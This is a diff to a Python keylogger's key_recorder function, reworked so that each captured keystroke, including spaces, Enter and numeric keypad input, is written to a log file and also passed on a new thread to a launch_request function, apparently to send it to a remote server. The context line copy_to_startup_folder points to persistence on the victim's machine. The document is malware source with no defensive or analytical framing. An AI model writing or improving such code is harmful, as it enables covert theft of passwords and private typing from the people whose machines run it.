@@ -25,32 +25,35 @@ def key_recorder(key):
     str_key = str(key)
     global line_length
     line_length += 1
+    char = ""
     if line_length >= 50:
-        f.write("\n")
+        char = "\n"
         line_length = 0
     if str_key == "Key.enter":
-        f.write('\n')
+        char = '\n'
     elif str_key == "Key.space":
-        f.write(" ")
+        char += " "
     elif str_key == "Key.backspace":
-        f.write(" {del} ")
+        char += " {del} "
         #     size = f.tell()  # the size...
         #     f.truncate(size - 1)
     elif len(re.findall(r'Key.([\w\d]+)', str_key)) > 0:
         if len(re.findall(r'Key.([\w\d]+)', str_key)[0]) > 1:
-            f.write("")
+            return
     elif len(re.findall(r'(x[\d]+)', str_key)) > 0:
-        f.write('')
+        return
     elif len(re.findall(r'<([\d]+)>', str_key)) > 0:
         if int(re.findall(r'<([\d]+)>', str_key)[0]) - 96 < 10:
-            f.write(str(int(re.findall(r'<([\d]+)>', str_key)[0]) - 96))
+            char += str(int(re.findall(r'<([\d]+)>', str_key)[0]) - 96)
         elif re.findall(r'<([\d]+)>', str_key)[0] == '110':
-            f.write('.')
+            char += '.'
     else:
-        print(str_key)
-        f.write(str_key.replace("'", ""))
-        t = threading.Thread(target=launch_request, args=(str_key,))
-        t.start()
+
+        char += str_key.replace("'", "")
+    print(char)
+    f.write(char)
+    t = threading.Thread(target=launch_request, args=(char,))
+    t.start()
 
 
 def copy_to_startup_folder():
